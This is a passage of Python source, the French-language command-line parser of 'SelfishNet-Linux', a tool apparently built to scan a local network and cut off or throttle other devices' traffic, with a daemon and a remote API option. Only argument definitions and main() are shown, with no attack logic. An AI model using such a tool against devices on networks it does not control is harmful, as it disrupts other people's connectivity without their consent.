               "  sudo selfishnet alias set 192.168.1.23 'TV Salon'\n"
               "  sudo selfishnet quit\n",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("--iface", help="interface réseau (défaut : route par défaut)")
    p.add_argument("-V", "--version", action="version", version=f"SelfishNet-Linux {VERSION}")
    sub = p.add_subparsers(dest="cmd")

    s = sub.add_parser("scan", help="découvrir les appareils du réseau")
    s.add_argument("-t", "--time", type=int, default=20, help="durée d'écoute (s)")
    s.add_argument("--watch", action="store_true", help="rafraîchir en continu")
    s.add_argument("--json", action="store_true", help="sortie au format JSON")
    s.set_defaults(func=cmd_scan)

    s = sub.add_parser("refresh", help="forcer un balayage ARP actif de tous les appareils")
    s.set_defaults(func=cmd_refresh)

    s = sub.add_parser("watch", help="lancer le service + interface interactive")
    s.add_argument("--rate", type=int, default=500, help="débit du preset 'limit' (kbit/s)")
    s.set_defaults(func=lambda a: (Daemon(a.iface, a.rate).run(tui=True), 0)[1])

    s = sub.add_parser("daemon", help="lancer le service en arrière-plan (sans TUI)")
    s.add_argument("--rate", type=int, default=500)
    s.add_argument("--api-port", type=int, default=None, help="activer l'API distante Companion Android (ex. 8443)")
    s.add_argument("--api-bind", default="127.0.0.1", help="adresse d'écoute de l'API distante (défaut : 127.0.0.1)")
    s.add_argument("--api-token", default=None, help="jeton Bearer personnalisé pour l'API distante")
    s.add_argument("--allow-all-local", action="store_true", help="autoriser tous les utilisateurs locaux sur le socket Unix (0666)")
    s.set_defaults(func=lambda a: (Daemon(
        a.iface, a.rate,
        api_port=a.api_port, api_bind=a.api_bind, api_token=a.api_token,
        allow_all_local=a.allow_all_local,
    ).run(tui=False), 0)[1])

    s = sub.add_parser("pause", help="couper totalement un/des appareil(s)")
    s.add_argument("target", help="n°, IP, MAC, 'all' (ex. 2  2,4  192.168.1.23  all)")
    s.add_argument("-d", "--duration", type=int, default=None, help="durée automatique en secondes avant libération")
    s.set_defaults(func=lambda a: _set_mode("pause", a))

    s = sub.add_parser("limit", help="plafonner le débit d'un/des appareil(s)")
    s.add_argument("target")
    s.add_argument("-r", "--rate", type=int, default=500, help="kbit/s (défaut 500)")
    s.add_argument("-d", "--duration", type=int, default=None, help="durée automatique en secondes avant libération")
    s.set_defaults(func=lambda a: _set_mode("limit", a))

    s = sub.add_parser("free", help="rendre un/des appareil(s) à la normale")
    s.add_argument("target", nargs="?", default="all")
    s.set_defaults(func=cmd_free)

    s_safe = sub.add_parser("safe", help="gérer le Safe Mode (appareils protégés)")
    s_safe.set_defaults(func=lambda a, _p=s_safe: (_p.print_help(), 0)[1])
    s_safe_sub = s_safe.add_subparsers(dest="safe_cmd")
    p_add = s_safe_sub.add_parser("add", help="protéger un appareil")
    p_add.add_argument("target", help="IP ou MAC de l'appareil à protéger")
    p_add.set_defaults(func=cmd_safe_add)
    p_del = s_safe_sub.add_parser("del", help="retirer un appareil du Safe Mode")
    p_del.add_argument("target", help="IP ou MAC de l'appareil")
    p_del.set_defaults(func=cmd_safe_del)
    p_list = s_safe_sub.add_parser("list", help="lister les appareils protégés")
    p_list.set_defaults(func=cmd_safe_list)

    s_alias = sub.add_parser("alias", help="gérer les noms personnalisés d'appareils")
    s_alias.set_defaults(func=lambda a, _p=s_alias: (_p.print_help(), 0)[1])
    s_alias_sub = s_alias.add_subparsers(dest="alias_cmd")
    a_set = s_alias_sub.add_parser("set", help="nommer un appareil")
    a_set.add_argument("target", help="MAC ou IP de l'appareil")
    a_set.add_argument("name", help="nom convivial (ex. 'TV Salon')")
    a_set.set_defaults(func=cmd_alias_set)
    a_del = s_alias_sub.add_parser("del", help="supprimer un alias")
    a_del.add_argument("target", help="MAC ou IP de l'appareil")
    a_del.set_defaults(func=cmd_alias_del)
    a_list = s_alias_sub.add_parser("list", help="lister les alias")
    a_list.set_defaults(func=cmd_alias_list)

    s = sub.add_parser("status", help="état courant (appareils + bridages actifs)")
    s.add_argument("--json", action="store_true", help="sortie au format JSON")
    s.set_defaults(func=cmd_status)

    s = sub.add_parser("quit", help="arrêter le service et tout restaurer")
    s.set_defaults(func=cmd_quit)

    s = sub.add_parser("clean", help="nettoyage d'urgence (règles + ARP)")
    s.set_defaults(func=cmd_clean)

    s = sub.add_parser("doctor", help="vérifier que la machine est prête")
    s.set_defaults(func=doctor)

    s = sub.add_parser("selftest", help="prouver que la pause marche sur un appareil")
    s.add_argument("target", help="IP d'un appareil de test (ex. votre téléphone)")
    s.set_defaults(func=selftest)

    return p


def main(argv=None):
    parser = build_parser()
    args = parser.parse_args(argv)
    if not getattr(args, "cmd", None):
        parser.print_help()
        return 0
    try:
        return args.func(args) or 0
    except KeyboardInterrupt:
        print("\ninterrompu.")
        return 130
    except PermissionError as exc:
        die(f"permission refusée ({exc}) — lancez avec sudo")
    except (RuntimeError, ValueError) as exc:
        die(str(exc))


if __name__ == "__main__":
    sys.exit(main())
